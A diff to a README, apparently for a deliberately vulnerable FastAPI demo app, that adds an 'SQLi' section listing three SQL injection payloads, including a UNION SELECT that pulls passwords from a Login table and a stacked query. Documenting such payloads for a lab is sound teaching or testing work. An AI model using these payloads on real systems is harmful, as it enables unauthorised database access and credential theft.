@@ -31,3 +31,19 @@ If you are developing a production application, we recommend updating the config
 ```sh
 python -m uvicorn main:app --reload
 ```
+
+## SQLi
+
+```sql
+UNION SELECT SQLITE_VERSION(),null,null,null;
+```
+
+```sql
+UNION  SELECT password, null,null,null FROM Login
+```
+
+```sql
+SELECT * FROM Workers WHERE id = 1; SELECT * FROM Login
+```
+
+
